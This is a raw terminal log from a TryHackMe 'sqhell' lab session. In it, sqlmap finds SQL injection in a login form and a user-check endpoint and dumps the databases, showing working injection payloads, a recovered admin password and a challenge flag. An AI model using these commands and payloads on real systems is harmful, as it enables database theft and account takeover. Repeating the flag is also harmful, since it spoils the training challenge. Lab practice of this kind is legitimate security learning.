@@ -1,0 +1,1500 @@
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# ping 10.10.96.42                                              
+PING 10.10.96.42 (10.10.96.42) 56(84) bytes of data.
+64 bytes from 10.10.96.42: icmp_seq=1 ttl=63 time=155 ms
+^Z
+zsh: suspended  ping 10.10.96.42
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u http://10.10.96.42/login --methord=POST --data=username=admin&password=admin -p username,password --risk=3 --levels=3 --random-agent
+[12] 142604
+-p: command not found
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─#         ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.7#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --methord
+[10:54:19] [WARNING] your sqlmap version is outdated
+
+[12]    exit 2     sqlmap -u http://10.10.96.42/login --methord=POST --data=username=admin
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u http://10.10.96.42/login --methord=POST --data="username=admin&password=admin" -p username,password --risk=3 --levels=3 --random-agent
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [']     | .'| . |                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --methord
+[10:54:43] [WARNING] your sqlmap version is outdated
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u http://10.10.96.42/login --method=POST --data="username=admin&password=admin" -p username,password --riDDDDDsk=3 --levels=3 --random-agent 
+        ___
+       __H__                                                                                                                         
+ ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  [)]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --riDDDDDsk
+[10:54:59] [WARNING] your sqlmap version is outdated
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u http://10.10.96.42/login --method=POST --data="username=admin&password=admin" -p username,password --risk=3 --levels=3 --random-agent 
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [(]     | .'| . |                                                                                                            
+|___|_  [']_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --levels
+[10:55:08] [WARNING] your sqlmap version is outdated
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u http://10.10.96.42/login --method=POST --data="username=admin&password=admin" -p username,password --risk=3 --level=3 --random-agent 
+        ___
+       __H__                                                                                                                         
+ ___ ___[)]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . ["]     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:55:17 /2023-04-30/
+
+[10:55:17] [INFO] fetched random HTTP User-Agent header value 'Opera/9.23 (Windows NT 5.1; U; it)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                 
+[10:55:18] [INFO] testing connection to the target URL
+[10:55:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:55:19] [INFO] testing if the target URL content is stable
+[10:55:19] [INFO] target URL content is stable
+[10:55:20] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[10:55:20] [INFO] testing for SQL injection on POST parameter 'username'
+[10:55:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:55:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[10:55:25] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="Logged")
+[10:55:29] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+[10:55:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[10:55:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[10:55:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[10:55:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[10:55:37] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[10:55:37] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[10:55:38] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[10:55:38] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[10:55:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:55:38] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:55:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:55:39] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:55:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[10:55:39] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[10:55:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:55:39] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[10:55:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[10:55:40] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[10:55:40] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[10:55:40] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[10:55:40] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[10:55:40] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[10:55:40] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[10:55:40] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[10:55:40] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[10:55:40] [INFO] testing 'Generic inline queries'
+[10:55:40] [INFO] testing 'MySQL inline queries'
+[10:55:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[10:55:51] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[10:55:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[10:56:01] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[10:56:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:56:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:56:06] [INFO] target URL appears to be UNION injectable with 3 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[10:56:16] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[10:56:16] [INFO] testing 'Generic UNION query (99) - 21 to 40 columns'
+[10:56:20] [INFO] testing 'Generic UNION query (99) - 41 to 60 columns'
+[10:56:24] [INFO] testing 'MySQL UNION query (99) - 1 to 20 columns'
+[10:56:31] [INFO] testing 'MySQL UNION query (99) - 21 to 40 columns'
+[10:56:35] [INFO] testing 'MySQL UNION query (99) - 41 to 60 columns'
+[10:56:39] [INFO] testing 'MySQL UNION query (99) - 61 to 80 columns'
+[10:56:43] [INFO] testing 'MySQL UNION query (99) - 81 to 100 columns'
+[10:56:47] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[10:56:47] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3347' OR 7028=7028-- nVuY&password=admin
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9677 FROM (SELECT(SLEEP(5)))Hmrs)-- HNDg&password=admin
+---
+[10:56:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[10:57:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[10:57:00] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 10:57:00 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/login" --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent --dbs --threads 10
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [,]     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:57:55 /2023-04-30/
+
+[10:57:55] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                      
+[10:57:55] [INFO] resuming back-end DBMS 'mysql' 
+[10:57:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3347' OR 7028=7028-- nVuY&password=admin
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9677 FROM (SELECT(SLEEP(5)))Hmrs)-- HNDg&password=admin
+---
+[10:57:55] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[10:57:55] [INFO] fetching database names
+[10:57:55] [INFO] fetching number of databases
+[10:57:56] [INFO] retrieved: 2
+[10:57:57] [INFO] retrieving the length of query output
+[10:57:57] [INFO] retrieved: 18
+[10:58:04] [INFO] retrieved: information_schema             
+[10:58:04] [INFO] retrieving the length of query output
+[10:58:04] [INFO] retrieved: 8
+[10:58:07] [INFO] retrieved: sqhell_2           
+available databases [2]:
+[*] information_schema
+[*] sqhell_2
+
+[10:58:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[10:58:07] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 10:58:07 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/login" --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqlhell_2 --dump-all --threads 10
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [.]     | .'| . |                                                                                                            
+|___|_  [.]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:58:59 /2023-04-30/
+
+[10:58:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                  
+[10:59:00] [INFO] resuming back-end DBMS 'mysql' 
+[10:59:00] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3347' OR 7028=7028-- nVuY&password=admin
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9677 FROM (SELECT(SLEEP(5)))Hmrs)-- HNDg&password=admin
+---
+[10:59:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[10:59:00] [INFO] fetching tables for database: 'sqlhell_2'
+[10:59:00] [INFO] fetching number of tables for database 'sqlhell_2'
+[10:59:00] [INFO] retrieved: 0
+[10:59:02] [WARNING] database 'sqlhell_2' appears to be empty
+[10:59:02] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] y
+which common tables (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-tables.txt' (press Enter)
+[2] custom
+> 
+[10:59:14] [INFO] performing table existence using items from '/usr/share/sqlmap/data/txt/common-tables.txt'
+[10:59:14] [INFO] adding words used on web page to the check list
+[10:59:14] [INFO] checking database 'sqlhell_2'
+[10:59:14] [INFO] starting 10 threads
+[11:03:12] [INFO] tried 1184/3444 items (34%)^Z
+zsh: suspended  sqlmap -u "http://10.10.96.42/login" --method=POST  -p "username,password"   
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/login" --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10 
+        ___
+       __H__                                                                                                                         
+ ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [']     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:03:32 /2023-04-30/
+
+[11:03:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 (.NET CLR 3.5.30729; .NET4.0C)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                             
+[11:03:32] [INFO] resuming back-end DBMS 'mysql' 
+[11:03:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3347' OR 7028=7028-- nVuY&password=admin
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9677 FROM (SELECT(SLEEP(5)))Hmrs)-- HNDg&password=admin
+---
+[11:03:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[11:03:32] [INFO] fetching tables for database: 'sqhell_2'
+[11:03:32] [INFO] fetching number of tables for database 'sqhell_2'
+[11:03:33] [INFO] retrieved: 1
+[11:03:34] [INFO] retrieving the length of query output
+[11:03:34] [INFO] retrieved: 5
+[11:03:38] [INFO] retrieved: users           
+[11:03:38] [INFO] fetching columns for table 'users' in database 'sqhell_2'
+[11:03:38] [INFO] retrieved: 3
+[11:03:39] [INFO] retrieving the length of query output
+[11:03:39] [INFO] retrieved: 2
+[11:03:43] [INFO] retrieved: id           
+[11:03:43] [INFO] retrieving the length of query output
+[11:03:43] [INFO] retrieved: 8
+[11:03:47] [INFO] retrieved: password           
+[11:03:47] [INFO] retrieving the length of query output
+[11:03:47] [INFO] retrieved: 8
+[11:03:52] [INFO] retrieved: username           
+[11:03:52] [INFO] fetching entries for table 'users' in database 'sqhell_2'
+[11:03:52] [INFO] fetching number of entries for table 'users' in database 'sqhell_2'
+[11:03:52] [INFO] retrieved: 1
+[11:03:53] [INFO] retrieving the length of query output
+[11:03:53] [INFO] retrieved: 1
+[11:03:54] [INFO] retrieved: 1
+[11:03:56] [INFO] retrieving the length of query output
+[11:03:56] [INFO] retrieved: 31
+[11:04:04] [INFO] retrieved: icantrememberthispasswordcanyou             
+[11:04:04] [INFO] retrieving the length of query output
+[11:04:04] [INFO] retrieved: 5
+[11:04:08] [INFO] retrieved: admin           
+Database: sqhell_2
+Table: users
+[1 entry]
++----+---------------------------------+----------+
+| id | password                        | username |
++----+---------------------------------+----------+
+| 1  | icantrememberthispasswordcanyou | admin    |
++----+---------------------------------+----------+
+
+[11:04:08] [INFO] table 'sqhell_2.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_2/users.csv'
+[11:04:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:04:08] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:04:08 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/register/user-check?username=admin2" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads 10
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:06:14 /2023-04-30/
+
+[11:06:15] [INFO] testing connection to the target URL
+[11:06:15] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:06:15] [INFO] testing if the target URL content is stable
+[11:06:15] [INFO] target URL content is stable
+[11:06:16] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
+[11:06:16] [INFO] testing for SQL injection on GET parameter 'username'
+[11:06:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:06:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[11:06:21] [INFO] GET parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
+[11:06:21] [INFO] testing 'Generic inline queries'
+[11:06:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:06:22] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:06:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:06:22] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:06:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[11:06:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[11:06:23] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:06:23] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[11:06:23] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[11:06:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[11:06:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[11:06:24] [INFO] testing 'MySQL inline queries'
+[11:06:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[11:06:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[11:06:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[11:06:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[11:06:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:06:35] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+Y
+[11:06:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:06:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:06:51] [INFO] target URL appears to be UNION injectable with 3 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[11:07:02] [INFO] testing 'Generic UNION query (33) - 21 to 40 columns'
+[11:07:06] [INFO] testing 'Generic UNION query (33) - 41 to 60 columns'
+[11:07:10] [INFO] testing 'MySQL UNION query (33) - 1 to 20 columns'
+[11:07:16] [INFO] testing 'MySQL UNION query (33) - 21 to 40 columns'
+[11:07:22] [INFO] testing 'MySQL UNION query (33) - 41 to 60 columns'
+[11:07:27] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[11:07:27] [INFO] checking if the injection point on GET parameter 'username' is a false positive
+GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+sqlmap identified the following injection point(s) with a total of 224 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-7917' OR 6990=6990-- pcWd
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin2' AND (SELECT 8836 FROM (SELECT(SLEEP(5)))yCZm)-- dZJe
+---
+[11:07:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[11:07:42] [INFO] fetching database names
+[11:07:42] [INFO] fetching number of databases
+[11:07:42] [INFO] retrieved: 2
+[11:07:43] [INFO] retrieving the length of query output
+[11:07:43] [INFO] retrieved: 18
+[11:07:51] [INFO] retrieved: information_schema             
+[11:07:51] [INFO] retrieving the length of query output
+[11:07:51] [INFO] retrieved: 8
+[11:07:56] [INFO] retrieved: sqhell_3           
+available databases [2]:
+[*] information_schema
+[*] sqhell_3
+
+[11:07:56] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:07:56] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:07:56 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/register/user-check?username=admin2" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads ┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/register/user-check?username=admin" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads 10 -D sqhell_3 -dump-all -dbms=mysql 
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.7#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:09:12 /2023-04-30/
+
+[11:09:12] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-7917' OR 6990=6990-- pcWd
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin2' AND (SELECT 8836 FROM (SELECT(SLEEP(5)))yCZm)-- dZJe
+---
+[11:09:13] [INFO] testing MySQL
+[11:09:13] [INFO] confirming MySQL
+[11:09:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:09:14] [INFO] fetching database names
+[11:09:14] [INFO] fetching number of databases
+[11:09:14] [INFO] resumed: 2
+[11:09:14] [INFO] retrieving the length of query output
+[11:09:14] [INFO] retrieved: 18
+[11:09:21] [INFO] retrieved: information_schema             
+[11:09:21] [INFO] retrieving the length of query output
+[11:09:21] [INFO] retrieved: 8
+[11:09:25] [INFO] retrieved: sqhell_3           
+available databases [2]:
+[*] information_schema
+[*] sqhell_3
+
+[11:09:25] [INFO] fetching tables for database: 'sqhell_3'
+[11:09:25] [INFO] fetching number of tables for database 'sqhell_3'
+[11:09:25] [INFO] retrieved: 2
+[11:09:26] [INFO] retrieving the length of query output
+[11:09:26] [INFO] retrieved: 4
+[11:09:30] [INFO] retrieved: flag           
+[11:09:30] [INFO] retrieving the length of query output
+[11:09:30] [INFO] retrieved: 5
+[11:09:34] [INFO] retrieved: users           
+[11:09:34] [INFO] fetching columns for table 'flag' in database 'sqhell_3'
+[11:09:34] [INFO] retrieved: 2
+[11:09:35] [INFO] retrieving the length of query output
+[11:09:35] [INFO] retrieved: 4
+[11:09:39] [INFO] retrieved: flag           
+[11:09:39] [INFO] retrieving the length of query output
+[11:09:39] [INFO] retrieved: 2
+[11:09:42] [INFO] retrieved: id           
+[11:09:42] [INFO] fetching entries for table 'flag' in database 'sqhell_3'
+[11:09:42] [INFO] fetching number of entries for table 'flag' in database 'sqhell_3'
+[11:09:42] [INFO] retrieved: 1
+[11:09:44] [INFO] retrieving the length of query output
+[11:09:44] [INFO] retrieved: 43
+[11:09:57] [INFO] retrieved: THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}             
+[11:09:57] [INFO] retrieving the length of query output
+[11:09:57] [INFO] retrieved: 1
+[11:09:58] [INFO] retrieved: 1
+Database: sqhell_3
+Table: flag
+[1 entry]
++----+---------------------------------------------+
+| id | flag                                        |
++----+---------------------------------------------+
+| 1  | THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308} |
++----+---------------------------------------------+
+
+[11:10:00] [INFO] table 'sqhell_3.flag' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_3/flag.csv'
+[11:10:00] [INFO] fetching columns for table 'users' in database 'sqhell_3'
+[11:10:00] [INFO] retrieved: 3
+[11:10:01] [INFO] retrieving the length of query output
+[11:10:01] [INFO] retrieved: 2
+[11:10:05] [INFO] retrieved: id           
+[11:10:05] [INFO] retrieving the length of query output
